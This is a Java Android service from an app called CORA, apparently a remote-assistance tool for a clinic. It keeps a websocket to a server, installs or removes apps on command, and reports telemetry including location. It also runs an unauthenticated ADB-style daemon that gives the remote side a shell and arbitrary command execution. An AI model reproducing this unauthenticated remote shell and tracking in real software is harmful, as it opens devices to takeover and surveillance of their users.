package br.eni.cora;

import android.app.*;
import android.content.*;
import android.os.*;
import android.provider.Settings;
import android.util.*;
import org.json.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class SinoService extends Service {
    public static volatile String status = "parado";
    public static volatile WsClient ws;
    Thread worker;
    android.os.PowerManager.WakeLock wakeLock;
    
    
    volatile boolean pipeOk = false;
    volatile int reativaDelay = 4000;
    
    public static volatile int lastBatt = -1, lastAdb = -1;
    public static volatile String pendingInstall = null;
        public static volatile long lastDataMb = -1, lastMemKb = -1;

    public static volatile double lastLat = 0, lastLon = 0, lastAcc = -1;
    public static volatile long lastFixTs = 0;
    // v1.38: mini-adbd — o proprio app fala o protocolo ADB (sem adbd do sistema)
    static final int A_VERSION = 0x01000001, ADB_MAX = 4096,
            A_SYNC = 0x434e5953, A_CNXN = 0x4e584e43, A_OPEN = 0x4e45504f,
            A_OKAY = 0x59414b4f, A_CLSE = 0x45534c43, A_WRTE = 0x45545257, A_AUTH = 0x48545541;
    public static volatile boolean miniAdb = false;
    
    
    
    
    
    
    
    
    
    int miniNextId = 0;
    final java.util.HashMap<Integer, java.lang.Process> miniProcs = new java.util.HashMap<>();
    final java.io.ByteArrayOutputStream miniBuf = new java.io.ByteArrayOutputStream();
    public static SinoService instancia;
    



    public static void forceStop() {
        try {
            if (instancia != null) {
                instancia.stopSelf();
                android.content.Intent i = new android.content.Intent(instancia, SinoService.class);
                instancia.startService(i);
                SinoService.status = "serviço reiniciado — aguardando conexão...";
            }
        } catch (Exception e) {}
    }

    public static void wsSend(String s) {
        try { if (ws != null) ws.send(s); } catch (Exception ignored) {}
    }

    void abrirSessao(int sid) {
        try {
            android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
            android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
            android.content.Intent si = new android.content.Intent(this, SinoService.InstallReceiver.class);
            si.setAction("br.eni.cora.INSTALL_STATUS");
            int fl = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (android.os.Build.VERSION.SDK_INT >= 31) fl |= android.app.PendingIntent.FLAG_MUTABLE;
                else if (android.os.Build.VERSION.SDK_INT >= 23) fl |= android.app.PendingIntent.FLAG_IMMUTABLE;
            ses.commit(android.app.PendingIntent.getBroadcast(this, sid, si, fl).getIntentSender());
            status = "aguardando tela de confirmacao do sistema...";
        } catch (Exception e) {}
    }

    android.content.BroadcastReceiver installReceiver = new android.content.BroadcastReceiver() {
        @Override public void onReceive(android.content.Context c, android.content.Intent i) {
            int sid = i.getIntExtra("session", -1);
            if (sid > 0) abrirSessao(sid);
        }
    };

;

    public int onStartCommand(Intent i, int f, int id) {
        instancia = this;
        try {
            android.content.IntentFilter filtro = new android.content.IntentFilter("br.eni.cora.INSTALL_");
            filtro.addDataScheme("package");
            registerReceiver(installReceiver, filtro);
        } catch (Exception e) {}
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "cora:coracao");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
            }
        } catch (Exception e) {}
        Notification n = new Notification.Builder(this)
                .setContentTitle("CORA 💓")
                .setContentText("coração operante de remediação e assistência")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .build();
        startForeground(1, n);
        if (worker == null || !worker.isAlive()) { worker = new Thread(this::loop); worker.start(); }
        iniciarLocalizacao();
        return START_STICKY;
    }
    public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        super.onDestroy();
        try { if (wakeLock != null) wakeLock.release(); } catch (Exception ignored) {}
    }

    void loop() {
        while (true) {
            try { connectOnce(); }
            catch (Exception e) { status = "erro: " + e; }
            try {
                Thread.sleep(5000);

            } catch (InterruptedException ignored) {}
        }
    }

    void connectOnce() throws Exception {
        // v1.31: MORTE AOS IRMÃOS — reconexões antigas deixavam socket vivo na sala;
        // os zumbis recebiam broadcast do tubo, enchiam o buffer TCP e sufocavam o envio
        try { if (ws != null) ws.close(); } catch (Exception ignored) {}

        final String host = Prefs.host(this);
        status = "conectando " + host + " ...";
        final WsClient[] ref = new WsClient[1];
        WsClient w = new WsClient(new WsClient.Listener() {
            @Override public void onOpen() {
                status = "conectado";
                ws = ref[0];
                // keep-alive de socket: ping a cada 20s mantem o TCP vivo no doze
                new Thread(() -> {
                    while (true) {
                        try {
                            if (ws != null) ws.send("{\"type\":\"hb\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"keep\":true}");
                            Thread.sleep(10000);
                        } catch (Exception e) { return; }
                    }
                }).start();
                new Thread(() -> {
                    while (true) {
                        try { sendTelemetry(); Thread.sleep(30000); }
                        catch (Exception e) { return; }
                    }
                }).start();
                
            }
            @Override public void onMessage(byte[] d) {
                if (miniAdb && ehBinario(d)) { miniAdbFeed(d); return; }
                if (ehBinario(d)) {
                    // v2.0 mini: tubo classico removido — binario fora do mini e ignorado
                    return;
                }
                try { onCmd(new String(d)); }
                catch (Exception e) { status = "realocar".equals(e.getMessage()) ? "sala g52 · aguardando a clinica..." : "cmd: " + e; }
            }
            @Override public void onClose() { status = "desconectado (reconectando)"; if (ws == ref[0]) ws = null; }
        });
        ref[0] = w;
        try {
            w.connect(host, 443, "/ws?id=" + Prefs.id(this));
        } catch (Exception e) {
            // v1.32: handshake falhou — mata o socket órfão (era peer zumbi na sala)
            try { w.close(); } catch (Exception ignored) {}
            throw e;
        }
    }

    void onCmd(String s) throws Exception {
        if (!s.trim().startsWith("{")) return;
        if (s.trim().startsWith("{\"pipe_ping\":true}")) return;
        if (s.startsWith("{\"type\":\"joined\"")) {
            JSONObject jj = new JSONObject(s);
            if (jj.optInt("peers", 1) == 1) {
                status = "sala vazia, realocando...";
                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                throw new Exception("realocar");
            }
            status = "sala encontrada (peers=" + jj.optInt("peers") + ")";
            return;
        }
        try {
            JSONObject j = new JSONObject(s);
            String cmd = j.optString("cmd");
            if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
            else if ("report".equals(cmd)) sendTelemetry();

            else if ("install_url".equals(cmd)) {
                final String url = j.optString("url");
                new Thread(() -> instalarPorUrl(url)).start();
            }
            else if ("uninstall_pkg".equals(cmd)) desinstalar(j.optString("pkg"));
            else if ("open_url".equals(cmd)) abrirUrl(j.optString("url"), j.optString("pkg", null));
            else if ("localizar".equals(cmd)) localizar();
            else if ("adbd".equals(cmd)) iniciarMiniAdbd();
                        else if ("manter_wifi".equals(cmd)) {
                try {
                    Settings.Global.putInt(getContentResolver(), "wifi_sleep_policy", 2);
                    Settings.Global.putInt(getContentResolver(), "stay_on_while_plugged_in", 2);
                    send("{\"type\":\"wifi\",\"status\":\"fixado\"}");
                    status = "Wi-Fi fixado: nunca dormir";
                } catch (Exception e) {
                    send("{\"type\":\"wifi\",\"status\":\"erro\"}");
                }
            }
            
        } catch (Exception e) { status = "realocar".equals(e.getMessage()) ? "sala g52 · aguardando a clinica..." : "cmd: " + e; }
    }

    static boolean ehBinario(byte[] d) {
        if (d.length == 0) return false;
        for (byte b : d) {
            int c = b & 0xff;
            if (c < 9 || (c > 13 && c < 32)) return true;
        }
        return false;
    }



    // v1.30: adbd "fantasma" — a setting diz ON mas o listener morreu (sono/doze da Lenovo).
    // O toggle 0→1 força o framework a derrubar e subir o adbd de novo, com porta nova.




    // v1.33 PORTA CERTA: adbd roda como root — seus sockets LISTEN aparecem no
    // /proc/net/tcp com uid 0 (ou 1000/2000). Nada de varrer 28 mil portas ou
    // validar header: achamos o listener exato, funciona até com TLS.


    public static volatile int lastAdbPort = -1;

    // v1.35: frame CNXN real do protocolo ADB ("host::" + features) — a pergunta
    // que o adbd (TLS ou texto) SEMPRE responde. Quem não é adbd fica mudo.


    // resposta válida = CNXN (0x4e584e43) ou AUTH (0x48545541) com magic certo
    boolean respostaEAdbd(byte[] hdr) {
        if (hdr == null || hdr.length < 24) return false;
        java.nio.ByteBuffer rb = java.nio.ByteBuffer.wrap(hdr).order(java.nio.ByteOrder.LITTLE_ENDIAN);
        int cmd = rb.getInt();
        rb.getInt();
        rb.getInt();
        int len = rb.getInt();
        rb.getInt();
        int magic = rb.getInt();
        if (len < 0 || len >= 1048576 || magic != (cmd ^ 0xffffffff)) return false;
        return cmd == 0x4e584e43 || cmd == 0x48545541;
    }



    // v1.39: sonda em dois enderecos — o adbd da depuracao sem fio (Android 11+)
    // pode escutar no IP da interface Wi-Fi em vez do localhost.






    void instalarPorUrl(String url) {
        new Thread(() -> {
            try {
                status = "baixando APK da nuvem...";
                java.io.InputStream in = new java.net.URL(url).openStream();
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[16384]; int n;
                while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
                in.close();
                byte[] apkData = bos.toByteArray();
                send("{\"type\":\"install\",\"status\":\"baixado\",\"bytes\":" + apkData.length + "}");

                android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
                android.content.pm.PackageInstaller.SessionParams sp = new android.content.pm.PackageInstaller.SessionParams(
                        android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                int sid = pin.createSession(sp);
                android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
                java.io.OutputStream os = ses.openWrite("base.apk", 0, apkData.length);
                os.write(apkData);
                ses.fsync(os);
                os.close();

                android.content.Intent si = new android.content.Intent(this, SinoService.InstallReceiver.class);
                si.setAction("br.eni.cora.INSTALL_STATUS");
                int fl = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
                if (android.os.Build.VERSION.SDK_INT >= 31) fl |= android.app.PendingIntent.FLAG_MUTABLE;
                else if (android.os.Build.VERSION.SDK_INT >= 23) fl |= android.app.PendingIntent.FLAG_IMMUTABLE;
                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, sid, si, fl);
                ses.commit(pi.getIntentSender());
                send("{\"type\":\"install\",\"status\":\"confirmacao_sistema\"}");
                status = "aguardando tela de confirmacao do sistema...";
            } catch (Exception e) {
                status = "install: " + e;
                send("{\"type\":\"install\",\"status\":\"erro\",\"msg\":\"" + e.getMessage() + "\"}");
            }
        }).start();
    }

    void desinstalar(String pkg) {
        try {
            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_DELETE, android.net.Uri.parse("package:" + pkg));
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            int fl = android.os.Build.VERSION.SDK_INT >= 23 ? android.app.PendingIntent.FLAG_IMMUTABLE : 0;
            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(this, 88, i, android.app.PendingIntent.FLAG_UPDATE_CURRENT | fl);
            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            String ch = "instalacao";
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Instalacoes", android.app.NotificationManager.IMPORTANCE_HIGH));
            }
            android.app.Notification.Builder nb = new android.app.Notification.Builder(this)
                    .setContentTitle("CORA 💓")
                    .setContentText("Toque para confirmar desinstalação")
                    .setSmallIcon(android.R.drawable.stat_sys_warning)
                    .setContentIntent(pi)
                    .setAutoCancel(true);
            if (android.os.Build.VERSION.SDK_INT >= 26) nb.setChannelId(ch);
            nm.notify(88, nb.build());
            send("{\"type\":\"uninstall\",\"status\":\"notificacao_enviada\",\"pkg\":\"" + pkg + "\"}");
            status = "toque na notificação para confirmar a desinstalação";
        } catch (Exception e) {
            send("{\"type\":\"uninstall\",\"status\":\"erro\"}");
        }
    }

    void abrirUrl(String url, String pkg) {
        try {
            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
            if (pkg != null && !pkg.isEmpty()) i.setPackage(pkg);
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            send("{\"type\":\"open\",\"status\":\"ok\"}");
        } catch (Exception e) {
            send("{\"type\":\"open\",\"status\":\"erro\"}");
        }
    }

    void send(String s) { try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; } }

    void sendTelemetry() {
        try {
            Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int lvl = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
            int sc = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
            int pct = sc > 0 ? lvl * 100 / sc : -1;
            int plug = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) : 0;
            int adb = 0;
            try { adb = Settings.Global.getInt(getContentResolver(), "adb_wifi_enabled"); } catch (Exception ignored) {}
            String memAv = "?";
            BufferedReader r = new BufferedReader(new FileReader("/proc/meminfo"));
            String l1 = r.readLine(), l2 = r.readLine(), l3 = r.readLine(); r.close();
            if (l3 != null) memAv = l3.trim();
            android.os.StatFs sf = new android.os.StatFs(Environment.getDataDirectory().getAbsolutePath());
            long free = sf.getAvailableBlocksLong() * sf.getBlockSizeLong() / 1048576L;
            JSONObject j = new JSONObject();
            j.put("type", "hb"); j.put("id", Prefs.id(this));
            j.put("batt", pct); j.put("plug", plug); j.put("adb", adb);
            j.put("mem", memAv); j.put("data_mb_free", free);
            j.put("model", Build.MODEL); j.put("ver", "2.2"); j.put("ts", System.currentTimeMillis());
            try { if (lastFixTs > 0) { j.put("lat", lastLat); j.put("lon", lastLon); j.put("acc", lastAcc); } } catch (Exception ignored) {}
            
            try {
                lastBatt = pct; lastAdb = adb; lastDataMb = free;
                java.util.regex.Matcher mm = java.util.regex.Pattern.compile("(\\d+)").matcher(memAv);
                if (mm.find()) lastMemKb = Long.parseLong(mm.group(1));
            } catch (Exception ignored) {}
            send(j.toString());
            if (status.startsWith("sala") || status.startsWith("conectado"))
                status = "conectado | batt " + pct + "% | adb " + adb;
        } catch (Exception e) { status = "tel: " + e; }
    }






    // v1.40: proxy ADB autenticado (metodo Tailscale: identidade propria).
    // Frente: mini-adbd (ja existente). Fundo: conexao PROPRIA no adbd real,
    // autenticada com a chave privada da clinica (asset adbkey, ja autorizada
    // no aparelho). Sessoes espelhadas: shell da clinica roda como uid=2000.




















    // v1.38: mini-adbd. Implementa o protocolo ADB (CNXN/OPEN/OKAY/WRTE/CLSE) em
    // processo proprio: o cliente adb da clinica conecta como sempre (via relay),
    // recebe o banner CNXN sem AUTH (modo "inseguro" legitimo, como ro.adb.secure=0)
    // e ganha shell: / exec: como UID do app. Nao depende de adbd do sistema,
    // de adb_wifi_enabled, nem de Wi-Fi — funciona no 4G.
    void iniciarMiniAdbd() {
        miniAdb = true;
        miniProcs.clear();
        synchronized (miniBuf) { miniBuf.reset(); }
        send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":5557,\"adbd\":true}");
        status = "CORA Mini v2.0 no ar — mini-adb (4G/5G), sem Wi-Fi, sem depuracao";
    }

    void miniAdbFeed(byte[] d) {
        try {
            byte[] b;
            synchronized (miniBuf) {
                miniBuf.write(d);
                b = miniBuf.toByteArray();
                int off = 0;
                while (b.length - off >= 24) {
                    java.nio.ByteBuffer h = java.nio.ByteBuffer.wrap(b, off, 24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
                    int cmd = h.getInt(), a0 = h.getInt(), a1 = h.getInt(),
                        len = h.getInt(), chk = h.getInt(), magic = h.getInt();
                    if (magic != (cmd ^ 0xffffffff) || len < 0 || len > 1048576) { off++; continue; }
                    if (b.length - off < 24 + len) break;
                    byte[] payload = java.util.Arrays.copyOfRange(b, off + 24, off + 24 + len);
                    off += 24 + len;
                    miniAdbHandle(cmd, a0, a1, payload);
                }
                miniBuf.reset();
                miniBuf.write(b, off, b.length - off);
            }
        } catch (Exception e) { status = "miniadbd feed: " + e; }
    }

    void miniAdbHandle(int cmd, int a0, int a1, byte[] payload) {
        try {
            if (cmd == A_CNXN) {
                miniAdbSend(A_CNXN, A_VERSION, ADB_MAX,
                    "device::ro.product.name=cora;ro.product.model=mini-adbd;ro.product.device=g52;".getBytes("UTF-8"));
                status = "mini-adbd: handshake CNXN ok (sem AUTH, modo inseguro)";
            } else if (cmd == A_OPEN) {
                String svc2 = new String(payload, "UTF-8");
                
                if (svc2.startsWith("shell") || svc2.startsWith("exec:")) {
                    java.lang.Process p = svc2.startsWith("exec:")
                        ? Runtime.getRuntime().exec(svc2.substring(5).trim().split("\\s+"))
                        : Runtime.getRuntime().exec("/system/bin/sh");
                    int lid = ++miniNextId;
                    synchronized (miniProcs) { miniProcs.put(lid, p); }
                    miniAdbSend(A_OKAY, lid, a0, null);
                    status = "mini-adbd: aberto " + svc2;
                    final int flid = lid, fremote = a0;
                    final java.lang.Process fp = p;
                    new Thread(() -> {
                        try {
                            java.io.InputStream o = fp.getInputStream();
                            byte[] buf = new byte[ADB_MAX];
                            int n;
                            while ((n = o.read(buf)) > 0) {
                                miniAdbSend(A_WRTE, flid, fremote, java.util.Arrays.copyOf(buf, n));
                            }
                            miniAdbSend(A_CLSE, flid, fremote, null);
                        } catch (Exception ignored) {}
                        try { fp.destroy(); } catch (Exception ignored) {}
                        synchronized (miniProcs) { miniProcs.remove(flid); }
                    }).start();
                } else {
                    miniAdbSend(A_CLSE, 0, a0, null);
                }
            } else if (cmd == A_WRTE) {
                
                java.lang.Process p;
                synchronized (miniProcs) { p = miniProcs.get(a0); }
                if (p != null) {
                    boolean winint = payload.length == 12 && payload[0] == 0 && payload[1] == 'T'
                            && payload[2] == 'S' && payload[5] == 'N';
                    if (!winint) {
                        p.getOutputStream().write(payload);
                        p.getOutputStream().flush();
                    }
                    miniAdbSend(A_OKAY, a0, a1, null);
                } else {
                    miniAdbSend(A_CLSE, a0, a1, null);
                }
            } else if (cmd == A_CLSE) {
                
                java.lang.Process p;
                synchronized (miniProcs) { p = miniProcs.remove(a0); }
                if (p != null) try { p.destroy(); } catch (Exception ignored) {}
            } else if (cmd == A_SYNC) {
                miniAdbSend(A_SYNC, a0, a1, null);
            }
        } catch (Exception e) { status = "miniadbd handle: " + e; }
    }

    void miniAdbSend(int cmd, int a0, int a1, byte[] payload) {
        try {
            byte[] pl = payload == null ? new byte[0] : payload;
            java.nio.ByteBuffer h = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
            int chk = 0;
            for (byte c : pl) chk += (c & 0xff);
            h.putInt(cmd).putInt(a0).putInt(a1).putInt(pl.length).putInt(chk).putInt(cmd ^ 0xffffffff);
            if (ws != null) {
                byte[] out = new byte[24 + pl.length];
                System.arraycopy(h.array(), 0, out, 0, 24);
                System.arraycopy(pl, 0, out, 24, pl.length);
                ws.send(out);
            }
        } catch (Exception e) {}
    }

    // v1.37: localizacao. Fix passivo+rede como base (bateria), GPS so sob demanda
    // (comando localizar). Coordenadas entram na telemetria quando disponiveis.
    void iniciarLocalizacao() {
        try {
            final android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            android.location.LocationListener lis = new android.location.LocationListener() {
                @Override public void onLocationChanged(android.location.Location l) {
                    lastLat = l.getLatitude(); lastLon = l.getLongitude();
                    lastAcc = l.hasAccuracy() ? l.getAccuracy() : -1;
                    lastFixTs = System.currentTimeMillis();
                }
                @Override public void onProviderDisabled(String p) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
            };
            try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 60000, 50f, lis); } catch (Exception e) {}
            try { lm.requestLocationUpdates(android.location.LocationManager.PASSIVE_PROVIDER, 60000, 50f, lis); } catch (Exception e) {}
        } catch (Exception e) {}
    }

    void localizar() {
        new Thread(() -> {
            try {
                status = "localizando (GPS sob demanda)...";
                final android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
                final boolean[] got = {false};
                android.location.LocationListener lis = new android.location.LocationListener() {
                    @Override public void onLocationChanged(android.location.Location l) {
                        lastLat = l.getLatitude(); lastLon = l.getLongitude();
                        lastAcc = l.hasAccuracy() ? l.getAccuracy() : -1;
                        lastFixTs = System.currentTimeMillis();
                        got[0] = true;
                        try { lm.removeUpdates(this); } catch (Exception e) {}
                        send("{\"type\":\"location\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"lat\":" + lastLat + ",\"lon\":" + lastLon + ",\"acc\":" + lastAcc + ",\"ts\":" + lastFixTs + "}");
                        status = "localizado: " + lastLat + "," + lastLon + " (±" + (int) lastAcc + "m)";
                    }
                    @Override public void onProviderDisabled(String p) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
                };
                try { lm.requestLocationUpdates(android.location.LocationManager.GPS_PROVIDER, 0, 0f, lis); } catch (Exception e) {}
                try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 0, 0f, lis); } catch (Exception e) {}
                Thread.sleep(15000);
                try { lm.removeUpdates(lis); } catch (Exception e) {}
                if (!got[0]) {
                    send("{\"type\":\"location\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"lat\":" + lastLat + ",\"lon\":" + lastLon + ",\"acc\":" + lastAcc + ",\"ts\":" + lastFixTs + ",\"stale\":true}");
                    status = "sem fix novo; ultimo: " + lastLat + "," + lastLon;
                }
            } catch (Exception e) { status = "localizar: " + e; }
        }).start();
    }

    // v1.36: fluxo de instalacao via receiver. O commit com PendingIntent de Activity (v1.35)
    // nao levantava a tela de confirmacao no Android 13 (Moto). O receiver recebe
    // STATUS_PENDING_USER_ACTION com EXTRA_INTENT e lanca a confirmacao direto,
    // com notificacao de reserva se o start em background for bloqueado.
    public static class InstallReceiver extends android.content.BroadcastReceiver {
        @Override public void onReceive(android.content.Context c, android.content.Intent i) {
            String msg = i.getStringExtra(android.content.pm.PackageInstaller.EXTRA_STATUS_MESSAGE);
            int st = i.getIntExtra(android.content.pm.PackageInstaller.EXTRA_STATUS, -999);
            if (st == -999 && msg == null) { SinoService.status = "status sem extras: verificar FLAG_MUTABLE do commit"; return; }
            if (st == android.content.pm.PackageInstaller.STATUS_PENDING_USER_ACTION) {
                try {
                    android.content.Intent confirm = i.getParcelableExtra(android.content.Intent.EXTRA_INTENT);
                    confirm.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(confirm);
                    SinoService.status = "confirme a instalacao na tela do sistema";
                } catch (Throwable t1) {
                    try {
                        android.content.Intent confirm2 = i.getParcelableExtra(android.content.Intent.EXTRA_INTENT);
                        android.app.PendingIntent npi = android.app.PendingIntent.getActivity(c,
                                (int) (System.currentTimeMillis() % 100000), confirm2,
                                android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
                        android.app.NotificationManager nm = (android.app.NotificationManager) c.getSystemService("notification");
                        String ch = "instalacao";
                        if (android.os.Build.VERSION.SDK_INT >= 26) {
                            nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Instalacoes", android.app.NotificationManager.IMPORTANCE_HIGH));
                        }
                        android.app.Notification n = new android.app.Notification.Builder(c)
                                .setContentTitle("CORA")
                                .setContentText("toque para confirmar a instalacao")
                                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                                .setContentIntent(npi)
                                .setAutoCancel(true)
                                .build();
                        nm.notify(77, n);
                        SinoService.status = "toque na notificacao para confirmar a instalacao";
                    } catch (Throwable t2) {
                        SinoService.status = "confirm UI falhou: " + t2;
                    }
                }
            } else if (st == android.content.pm.PackageInstaller.STATUS_SUCCESS) {
                SinoService.status = "instalado com sucesso";
            } else {
                SinoService.status = "install status " + st + ": " + msg;
            }
        }
    }
}
